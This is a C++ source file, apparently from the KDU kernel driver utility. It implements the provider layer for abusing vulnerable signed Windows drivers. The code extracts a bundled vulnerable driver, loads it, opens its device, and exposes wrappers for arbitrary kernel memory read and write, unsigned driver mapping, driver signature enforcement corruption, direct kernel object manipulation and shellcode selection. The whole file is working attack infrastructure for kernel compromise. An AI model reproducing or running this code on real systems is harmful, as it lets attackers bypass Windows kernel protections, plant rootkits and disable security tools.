﻿/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       KDUPROV.CPP
*
*  VERSION:     1.26
*
*  DATE:        15 Oct 2022
*
*  Vulnerable drivers provider abstraction layer.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/nal.h"
#include "idrv/rtcore.h"
#include "idrv/mapmem.h"
#include "idrv/atszio.h"
#include "idrv/winio.h"
#include "idrv/winring0.h"
#include "idrv/phymem.h"
#include "idrv/lha.h"
#include "idrv/directio64.h"
#include "idrv/gmer.h"
#include "idrv/dbutil.h"
#include "idrv/mimidrv.h"
#include "idrv/kph.h"
#include "idrv/procexp.h"
#include "idrv/dbk.h"
#include "idrv/marvinhw.h"
#include "kduplist.h"

/*
* KDUFirmwareToString
*
* Purpose:
*
* Return human readable firmware name.
*
*/
LPCSTR KDUFirmwareToString(
    _In_ FIRMWARE_TYPE Firmware)
{
    switch (Firmware) {
    case FirmwareTypeBios:
        return "FirmwareTypeBios";
    case FirmwareTypeUefi:
        return "FirmwareTypeUefi";
    case FirmwareTypeUnknown:
    default:
        return "FirmwareTypeUnknown";
    }
}

/*
* KDUProvGetCount
*
* Purpose:
*
* Return count of available providers.
*
*/
ULONG KDUProvGetCount()
{
    return RTL_NUMBER_OF(g_KDUProviders);
}

/*
* KDUProvGetReference
*
* Purpose:
*
* Return pointer to KDU providers list.
*
*/
PKDU_PROVIDER KDUProvGetReference()
{
    return g_KDUProviders;
}

/*
* KDUProvList
*
* Purpose:
*
* Output available providers.
*
*/
VOID KDUProvList()
{
    KDU_PROVIDER* prov;
    CONST CHAR* pszDesc;
    ULONG provCount = KDUProvGetCount();

    FUNCTION_ENTER_MSG(__FUNCTION__);

    for (ULONG i = 0; i < provCount; i++) {
        prov = &g_KDUProviders[i];

        printf_s("Provider # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
            i,
            prov->Desciption,
            prov->DriverName,
            prov->DeviceName);

        //
        // Show signer.
        //
        printf_s("\tSigned by: \"%ws\"\r\n",
            prov->SignerName);

        //
        // Shellcode support
        //
        printf_s("\tShellcode support mask: 0x%08x\r\n", prov->SupportedShellFlags);

        //
        // List provider flags.
        //
        if (prov->SignatureWHQL)
            printf_s("\tDriver is WHQL signed\r\n");
        //
        // Some Realtek drivers are digitally signed 
        // after binary modification with wrong PE checksum as result.
        // Note: Windows 7 will not allow their load.
        //
        if (prov->IgnoreChecksum)
            printf_s("\tIgnore invalid image checksum\r\n");

        //
        // Some BIOS flashing drivers does not support unload.
        //
        if (prov->NoUnloadSupported)
            printf_s("\tDriver does not support unload procedure\r\n");

        if (prov->PML4FromLowStub)
            printf_s("\tVirtual to physical addresses translation require PML4 query from low stub\r\n");

        if (prov->NoVictim)
            printf_s("\tNo victim required\r\n");

        //
        // List "based" flags.
        //
        if (prov->DrvSourceBase != SourceBaseNone)
        {
            switch (prov->DrvSourceBase) {
            case SourceBaseWinIo:
                pszDesc = WINIO_BASE_DESC;
                break;
            case SourceBaseWinRing0:
                pszDesc = WINRING0_BASE_DESC;
                break;
            case SourceBasePhyMem:
                pszDesc = PHYMEM_BASE_DESC;
                break;
            case SourceBaseMapMem:
                pszDesc = MAPMEM_BASE_DESC;
                break;
            default:
                pszDesc = "Unknown";
                break;
            }

            printf_s("\tBased on: %s\r\n", pszDesc);
        }

        //
        // Minimum support Windows build.
        //
        printf_s("\tMinimum supported Windows build: %lu\r\n",
            prov->MinNtBuildNumberSupport);

        //
        // Maximum support Windows build.
        //
        if (prov->MaxNtBuildNumberSupport == KDU_MAX_NTBUILDNUMBER) {
            printf_s("\tMaximum Windows build undefined, no restrictions\r\n");
        }
        else {
            printf_s("\tMaximum supported Windows build: %lu\r\n",
                prov->MaxNtBuildNumberSupport);
        }

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}

/*
* KDUProvExtractVulnerableDriver
*
* Purpose:
*
* Extract vulnerable driver from resource.
*
*/
BOOL KDUProvExtractVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0, writeBytes;
    ULONG    uResourceId = Context->Provider->ResourceId;
    LPWSTR   lpFullFileName = Context->DriverFileName;
    PBYTE    drvBuffer;

    //
    // Extract driver resource to the file.
    //
    drvBuffer = (PBYTE)KDULoadResource(uResourceId,
        Context->ModuleBase,
        &resourceSize,
        PROVIDER_RES_KEY,
        Context->Provider->IgnoreChecksum ? FALSE : TRUE);

    if (drvBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Driver resource id cannot be found %lu\r\n", uResourceId);

        return FALSE;
    }

    printf_s("[+] Extracting vulnerable driver as \"%ws\"\r\n", lpFullFileName);

    writeBytes = (ULONG)supWriteBufferToFile(lpFullFileName,
        drvBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus);

    supHeapFree(drvBuffer);

    if (resourceSize != writeBytes) {

        supPrintfEvent(kduEventError,
            "[!] Unable to extract vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);

        return FALSE;
    }

    return TRUE;
}

/*
* KDUProvLoadVulnerableDriver
*
* Purpose:
*
* Load provider vulnerable driver.
*
*/
BOOL KDUProvLoadVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    NTSTATUS ntStatus;

    LPWSTR   lpFullFileName = Context->DriverFileName;
    LPWSTR   lpDriverName = Context->Provider->DriverName;


    if (!KDUProvExtractVulnerableDriver(Context))
        return FALSE;

    //
    // Load driver.
    //
    ntStatus = supLoadDriver(lpDriverName, lpFullFileName, FALSE);
    if (NT_SUCCESS(ntStatus)) {
        supPrintfEvent(kduEventInformation, 
            "[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);
        bLoaded = TRUE;
    }
    else {
        
        supPrintfEvent(kduEventError, 
            "[!] Unable to load vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
        
        DeleteFile(lpFullFileName);
    }

    return bLoaded;
}

/*
* KDUProvStartVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
BOOL KDUProvStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    LPWSTR   lpDeviceName = Context->Provider->DeviceName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {
        
        supPrintfEvent(kduEventError, 
            "[!] Vulnerable driver is already loaded\r\n");
        
        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        bLoaded = KDUProvLoadVulnerableDriver(Context);

    }

    //
    // If driver loaded then open handle for it and run optional callbacks.
    //
    if (bLoaded) {
       KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
    }

    return (Context->DeviceHandle != NULL);
}

/*
* KDUProvOpenVulnerableDriverAndRunCallbacks
*
* Purpose:
*
* Open handle for vulnerable driver and run optional callbacks if they are defined.
*
*/
void KDUProvOpenVulnerableDriverAndRunCallbacks(
    _In_ KDU_CONTEXT* Context
)
{   
    HANDLE deviceHandle = NULL;

    //
    // Run pre-open callback (optional).
    //
    if (Context->Provider->Callbacks.PreOpenDriver) {
        printf_s("[+] Executing pre-open callback for given provider\r\n");
        Context->Provider->Callbacks.PreOpenDriver((PVOID)Context);
    }

    NTSTATUS ntStatus = supOpenDriver(Context->Provider->DeviceName, 
        WRITE_DAC | GENERIC_WRITE | GENERIC_READ, 
        &deviceHandle);

    if (!NT_SUCCESS(ntStatus)) {

        supPrintfEvent(kduEventError,
            "[!] Unable to open vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);

    }
    else {

        supPrintfEvent(kduEventInformation, 
            "[+] Vulnerable driver \"%ws\" opened\r\n",
            Context->Provider->DriverName);

        Context->DeviceHandle = deviceHandle;

        //
        // Run post-open callback (optional).
        //
        if (Context->Provider->Callbacks.PostOpenDriver) {

            printf_s("[+] Executing post-open callback for given provider\r\n");

            Context->Provider->Callbacks.PostOpenDriver((PVOID)Context);

        }

    }
}

/*
* KDUProvStopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver.
*
*/
void KDUProvStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    LPWSTR lpDriverName = Context->Provider->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    ntStatus = supUnloadDriver(lpDriverName, TRUE);
    if (!NT_SUCCESS(ntStatus)) {
        
        supPrintfEvent(kduEventError, 
            "[!] Unable to unload vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);

    }
    else {

        supPrintfEvent(kduEventInformation,
            "[+] Vulnerable driver \"%ws\" unloaded\r\n", 
            lpDriverName);

        if (supDeleteFileWithWait(1000, 5, lpFullFileName))
            printf_s("[+] Vulnerable driver file removed\r\n");

    }
}

/*
* KDUProviderPostOpen
*
* Purpose:
*
* Provider post-open driver generic callback.
*
*/
BOOL WINAPI KDUProviderPostOpen(
    _In_ PVOID Param
)
{
    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;
    PSECURITY_DESCRIPTOR driverSD = NULL;

    PACL defaultAcl = NULL;
    HANDLE deviceHandle;

    deviceHandle = Context->DeviceHandle;

    //
    // Check if we need to forcebly set SD.
    //
    if (Context->Provider->NoForcedSD == FALSE) {

        //
        // At least make less mess.
        // However if driver author is an idiot just like Unwinder, it won't much help.
        //
        NTSTATUS ntStatus;

        ntStatus = supCreateSystemAdminAccessSD(&driverSD, &defaultAcl);

        if (NT_SUCCESS(ntStatus)) {

            ntStatus = NtSetSecurityObject(deviceHandle,
                DACL_SECURITY_INFORMATION,
                driverSD);

            if (!NT_SUCCESS(ntStatus)) {

                supPrintfEvent(kduEventError,
                    "[!] Unable to set driver device security descriptor, NTSTATUS (0x%lX)\r\n", ntStatus);

            }
            else {
                printf_s("[+] Driver device security descriptor set successfully\r\n");
            }

            if (defaultAcl) supHeapFree(defaultAcl);
            supHeapFree(driverSD);

        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Unable to allocate security descriptor, NTSTATUS (0x%lX)\r\n", ntStatus);

        }

    }

    //
    // Remove WRITE_DAC from result handle.
    //
    HANDLE strHandle = NULL;

    if (NT_SUCCESS(NtDuplicateObject(NtCurrentProcess(),
        deviceHandle,
        NtCurrentProcess(),
        &strHandle,
        GENERIC_WRITE | GENERIC_READ,
        0,
        0)))
    {
        NtClose(deviceHandle);
        deviceHandle = strHandle;
    }

    Context->DeviceHandle = deviceHandle;

    return (deviceHandle != NULL);
}

/*
* KDUVirtualToPhysical
*
* Purpose:
*
* Provider wrapper for VirtualToPhysical routine.
*
*/
BOOL WINAPI KDUVirtualToPhysical(
    _In_ KDU_CONTEXT* Context,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    KDU_PROVIDER* prov = Context->Provider;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (prov->Callbacks.VirtualToPhysical == NULL) {
        SetLastError(ERROR_NOT_SUPPORTED);
        return FALSE;
    }

    return prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
        VirtualAddress,
        PhysicalAddress);
}

/*
* KDUReadKernelVM
*
* Purpose:
*
* Provider wrapper for ReadKernelVM routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUReadKernelVM(
    _In_ KDU_CONTEXT * Context,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    if (Address < Context->MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Some providers under several conditions may crash here without bugcheck.
    //
    __try {

        bResult = prov->Callbacks.ReadKernelVM(Context->DeviceHandle,
            Address,
            Buffer,
            NumberOfBytes);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUWriteKernelVM
*
* Purpose:
*
* Provider wrapper for WriteKernelVM routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUWriteKernelVM(
    _In_ KDU_CONTEXT * Context,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    if (Address < Context->MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Some providers under several conditions may crash here without bugcheck.
    //
    __try {

        bResult = prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
            Address,
            Buffer,
            NumberOfBytes);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUProviderLoadDB
*
* Purpose:
*
* Load drivers database file.
*
*/
HINSTANCE KDUProviderLoadDB(
    VOID
)
{
    HINSTANCE hInstance;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    SetDllDirectory(NULL);
    hInstance = LoadLibraryEx(DRV64DLL, NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (hInstance) {
        printf_s("[+] Drivers database \"%ws\" loaded at 0x%p\r\n", DRV64DLL, hInstance);
    }
    else {

        supPrintfEvent(kduEventError, 
            "[!] Could not load drivers database, GetLastError %lu\r\n", GetLastError());

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return hInstance;
}

/*
* KDUProviderVerifyActionType
*
* Purpose:
*
* Verify key provider functionality.
*
*/
BOOL KDUProviderVerifyActionType(
    _In_ KDU_PROVIDER* Provider,
    _In_ KDU_ACTION_TYPE ActionType)
{
    BOOL bResult = TRUE;

#ifdef _DEBUG
    return TRUE;
#endif

    switch (ActionType) {
    case ActionTypeDKOM:
    case ActionTypeMapDriver:
    case ActionTypeDSECorruption:

        //
        // Check if we can translate.
        //
        if (Provider->PML4FromLowStub && Provider->Callbacks.VirtualToPhysical == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support memory translation or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            return FALSE;
        }
        break;
    default:
        break;
    }

    switch (ActionType) {

    case ActionTypeDKOM:

        //
        // Check if we can read/write.
        //
        if (Provider->Callbacks.ReadKernelVM == NULL ||
            Provider->Callbacks.WriteKernelVM == NULL)
        {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            bResult = FALSE;

        }
        break;

    case ActionTypeMapDriver:

        //
        // Check if we can map.
        //
        if (Provider->Callbacks.MapDriver == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support driver mapping or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            bResult = FALSE;

        }

        break;

    case ActionTypeDSECorruption:

        //
        // Check if we have DSE control callback set.
        //
        if ((PVOID)Provider->Callbacks.ControlDSE == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider does not support changing DSE values or\r\n"\
                "\tKDU interface is not implemented for this method.\r\n");

            bResult = FALSE;

        }
        break;

    default:
        break;
    }

    return bResult;
}

VOID KDUFallBackOnLoad(
    _Inout_ PKDU_CONTEXT *Context
)
{
    PKDU_CONTEXT ctx = *Context;
    
    if (ctx->DeviceHandle)
        NtClose(ctx->DeviceHandle);
    
    ctx->Provider->Callbacks.StopVulnerableDriver(ctx);
    
    if (ctx->DriverFileName)
        supHeapFree(ctx->DriverFileName);
    
    supHeapFree(ctx);
    *Context = NULL;
}

BOOL KDUIsSupportedShell(
    _In_ ULONG ShellCodeVersion,
    _In_ ULONG ProviderFlags)
{
    ULONG value;
    switch (ShellCodeVersion) {
    case KDU_SHELLCODE_V1:
        value = KDUPROV_SC_V1;
        break;
    case KDU_SHELLCODE_V2:
        value = KDUPROV_SC_V2;
        break;
    case KDU_SHELLCODE_V3:
        value = KDUPROV_SC_V3;
        break;
    case KDU_SHELLCODE_V4:
        value = KDUPROV_SC_V4;
        break;
    default:
        return FALSE;
    }

    return ((ProviderFlags & value) > 0);
}

/*
* KDUProviderCreate
*
* Purpose:
*
* Create Provider to work with it.
*
*/
PKDU_CONTEXT WINAPI KDUProviderCreate(
    _In_ ULONG ProviderId,
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ShellCodeVersion,
    _In_ KDU_ACTION_TYPE ActionType
)
{
    HINSTANCE moduleBase;
    KDU_CONTEXT* Context = NULL;
    KDU_PROVIDER* prov;
    NTSTATUS ntStatus;

    FIRMWARE_TYPE fmwType;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {

        if (ProviderId >= KDUProvGetCount())
            ProviderId = KDU_PROVIDER_DEFAULT;

        prov = &g_KDUProviders[ProviderId];

        if (ShellCodeVersion != KDU_SHELLCODE_NONE) {
            if (!KDUIsSupportedShell(ShellCodeVersion, prov->SupportedShellFlags)) {
                supPrintfEvent(kduEventError, 
                    "[!] Selected shellcode %lu is not supported by this provider (supported mask: 0x%08x), abort\r\n", 
                    ShellCodeVersion, prov->SupportedShellFlags);
                break;
            }
        }

        ntStatus = supGetFirmwareType(&fmwType);
        if (!NT_SUCCESS(ntStatus)) {
            printf_s("[!] Could not query firmware type, NTSTATUS (0x%lX)\r\n", ntStatus);
        }
        else {

            supPrintfEvent(kduEventNone, "[+] Firmware type (%s)\r\n",
                KDUFirmwareToString(fmwType));

            /*if (prov->PML4FromLowStub)
                if (fmwType != FirmwareTypeUefi) {

                    supPrintfEvent(kduEventError, "[!] Unsupported PC firmware type for this provider (req: %s, got: %s)\r\n",
                        KDUFirmwareToString(FirmwareTypeUefi),
                        KDUFirmwareToString(fmwType));

                    break;
                }*/
        }

        //
        // Show provider info.
        //
        supPrintfEvent(kduEventInformation, "[+] Provider: \"%ws\", Name \"%ws\"\r\n",
            prov->Desciption,
            prov->DriverName);

        //
        // Check HVCI support.
        //
        if (HvciEnabled && prov->SupportHVCI == 0) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: selected provider does not support HVCI\r\n");
            
            break;
        }

        //
        // Check current Windows NT build number.
        //

        if (NtBuildNumber < prov->MinNtBuildNumberSupport) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: selected provider require newer Windows NT version\r\n");
            
            break;
        }

        //
        // Let it burn if they want.
        //

        if (prov->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
            if (NtBuildNumber > prov->MaxNtBuildNumberSupport) {
                
                supPrintfEvent(kduEventError, 
                    "[!] Warning: selected provider may not work on this Windows NT version\r\n");
                
            }
        }

        if (!KDUProviderVerifyActionType(prov, ActionType))
            break;

        //
        // Load drivers DB.
        //
        moduleBase = KDUProviderLoadDB();
        if (moduleBase == NULL) {
            break;
        }

        ntStatus = supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: SeDebugPrivilege is not assigned! NTSTATUS (0x%lX)\r\n", ntStatus);
            
            break;
        }

        ntStatus = supEnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: SeLoadDriverPrivilege is not assigned! NTSTATUS (0x%lX)\r\n", ntStatus);
            
            break;
        }

        //
        // Allocate KDU_CONTEXT structure and fill it with data.
        //
        Context = (KDU_CONTEXT*)supHeapAlloc(sizeof(KDU_CONTEXT));
        if (Context == NULL) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: could not allocate provider context\r\n");
            
            break;
        }

        Context->Provider = &g_KDUProviders[ProviderId];

        if (Context->Provider->NoVictim) {
            Context->Victim = NULL;
        }
        else {
            Context->Victim = &g_KDUVictims[KDU_VICTIM_DEFAULT];
        }

        PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
        SIZE_T length = 64 +
            (_strlen(Context->Provider->DriverName) * sizeof(WCHAR)) +
            CurrentDirectory->Length;

        Context->DriverFileName = (LPWSTR)supHeapAlloc(length);
        if (Context->DriverFileName == NULL) {
            supHeapFree(Context);
            Context = NULL;
        }
        else {

            Context->ShellVersion = ShellCodeVersion;
            Context->NtBuildNumber = NtBuildNumber;
            Context->ModuleBase = moduleBase;
            Context->NtOsBase = supGetNtOsBase();
            Context->MaximumUserModeAddress = supQueryMaximumUserModeAddress();
            Context->MemoryTag = supSelectNonPagedPoolTag();

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(Context->DriverFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            _strcat(Context->DriverFileName, TEXT("\\"));
            _strcat(Context->DriverFileName, Context->Provider->DriverName);
            _strcat(Context->DriverFileName, TEXT(".sys"));
           
            if (Context->Provider->Callbacks.StartVulnerableDriver(Context)) {

                //
                // Register (unlock, send love letter, whatever this provider want first) driver.
                //
                if ((PVOID)Context->Provider->Callbacks.RegisterDriver) {

                    PVOID regParam;

                    if (Context->Provider->NoVictim) {
                        regParam = (PVOID)Context;
                    }
                    else {
                        regParam = UlongToPtr(Context->Provider->ResourceId);
                    }

                    if (!Context->Provider->Callbacks.RegisterDriver(
                        Context->DeviceHandle,
                        regParam))
                    {

                        supPrintfEvent(kduEventError, 
                            "[!] Could not register provider driver, GetLastError %lu\r\n", GetLastError());

                        //
                        // This is hard error for some providers, abort execution.
                        //
                        KDUFallBackOnLoad(&Context);

                    }
                }

            }
            else {
                supHeapFree(Context->DriverFileName);
                supHeapFree(Context);
                Context = NULL;
            }

        }

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return Context;
}

/*
* KDUProviderRelease
*
* Purpose:
*
* Reelease Provider context, free resources and unload driver.
*
*/
VOID WINAPI KDUProviderRelease(
    _In_ KDU_CONTEXT * Context)
{
    FUNCTION_ENTER_MSG(__FUNCTION__);

    if (Context) {

        //
        // Unregister driver if supported.
        //
        if ((PVOID)Context->Provider->Callbacks.UnregisterDriver) {
            Context->Provider->Callbacks.UnregisterDriver(
                Context->DeviceHandle, 
                (PVOID)Context);
        }

        if (Context->DeviceHandle)
            NtClose(Context->DeviceHandle);

        if (Context->Provider->NoUnloadSupported) {
            supPrintfEvent(kduEventInformation,
                "[~] This driver does not support unload procedure, reboot PC to get rid of it\r\n");
        }
        else {

            //
            // Unload driver.
            //
            Context->Provider->Callbacks.StopVulnerableDriver(Context);

        }

        if (Context->DriverFileName)
            supHeapFree(Context->DriverFileName);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}
